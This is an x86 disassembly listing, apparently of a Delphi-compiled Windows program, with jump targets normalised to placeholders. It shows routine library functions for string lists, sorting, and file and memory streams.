mov [ fs : eax ] edx
push sub_419bde
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_419be4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419c98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4190f4
xor edx edx
push ebp
push sub_419c7b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c82
mov eax [ ebp - 0x4 ]
call sub_4191b0
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_404030
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_419ca8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419d1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41ddfc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41de04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d25
lea eax [ ebp - 0xc ]
call sub_403f40
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41dea4
inc esi
dec ebx
jne r-xdata
sub_419d50
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_419d6c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418f24
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_4049c8
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_419dd4
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4192a8
jmp r-xdata
sub_419e70
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_4049c8
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_419eb0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4192a8
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404ab4
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_419f1c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4192a8
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_4192a8
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_419f78
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_419f78
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_419f9c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41a014
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4192a8
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403f94
pop edi
pop esi
pop ebx
retn
sub_41a050
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4192a8
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41a078
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41a0ac
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_41964c
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41a0f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4192a8
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4192a8
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41a14c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41a078
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403f94
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028d8
sub_41a1c4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4192a8
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4192a8
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403f94
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a220
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4192a8
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a260
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_419f78
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41a260
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41a310
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_41a36c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_41a260
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41a3c0
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_41a3f4
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_41a458
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41a4ac
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4030bc
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
mov esp ebp
pop ebp
retn
sub_41a4f8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4030b4
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41a4ac
pop ecx
mov eax [ ebx ]
call sub_4030f8
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41a4ac
pop ecx
sub_41a57c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41a5ec
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
sub_41a624
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
sub_41a65c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_41a3e0
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026dc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_41a738
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a73f
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026fc
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41a5ec
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_41a624
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_41a750
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41add4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41a7a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41ce08
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a7a7
mov eax [ ebp - 0x8 ]
call sub_40316c
retn
sub_41a7b0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40313c
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41a80c
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4087e8
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41a84c
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40ceec
pop ebx
pop ebp
retn 0x8
sub_41a874
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_41a8b8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41a8b8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_41a9e1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403490
movzx edx di
mov eax esi
call sub_40870c
mov ecx eax
xor edx edx
mov eax ebx
call sub_41a7b0
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408788
mov ecx eax
xor edx edx
mov eax ebx
call sub_41a7b0
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a9e8
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403f64
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4089a0
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40b1c4
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4089a0
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40b1c4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
jmp r-xdata
sub_41a9e8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41aa0c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
call sub_408820
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_41aa48
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028d8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41aa80
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_41aaa4
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax esi
call sub_41aad0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_41aae8
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_41a3e0
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41a5ec
sub_41ab20
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41aa40
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_41ab48
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_41ab20
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_41ab74
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406cb8
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406c9c
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406c8c
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba88
call sub_4038f8
test ecx ecx
jne r-xdata
sub_41ac00
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028d8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_41ab20
sub_41ac50
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40313c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_404400
mov ecx eax
mov edx esi
mov eax edi
call sub_41ad18
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
